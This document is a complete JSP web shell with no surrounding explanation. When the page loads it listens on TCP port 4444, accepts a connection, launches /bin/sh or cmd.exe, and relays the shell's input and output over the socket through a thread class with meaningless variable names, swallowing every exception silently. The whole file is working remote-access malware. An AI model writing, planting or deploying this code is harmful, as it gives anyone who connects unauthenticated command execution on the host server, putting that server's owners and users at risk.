<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream bx;
    OutputStream vv;

    StreamConnector( InputStream bx, OutputStream vv )
    {
      this.bx = bx;
      this.vv = vv;
    }

    public void run()
    {
      BufferedReader mv  = null;
      BufferedWriter mhc = null;
      try
      {
        mv  = new BufferedReader( new InputStreamReader( this.bx ) );
        mhc = new BufferedWriter( new OutputStreamWriter( this.vv ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = mv.read( buffer, 0, buffer.length ) ) > 0 )
        {
          mhc.write( buffer, 0, length );
          mhc.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( mv != null )
          mv.close();
        if( mhc != null )
          mhc.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    ServerSocket server_socket = new ServerSocket( 4444 );
    Socket client_socket = server_socket.accept();
    server_socket.close();
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), client_socket.getOutputStream() ) ).start();
    ( new StreamConnector( client_socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
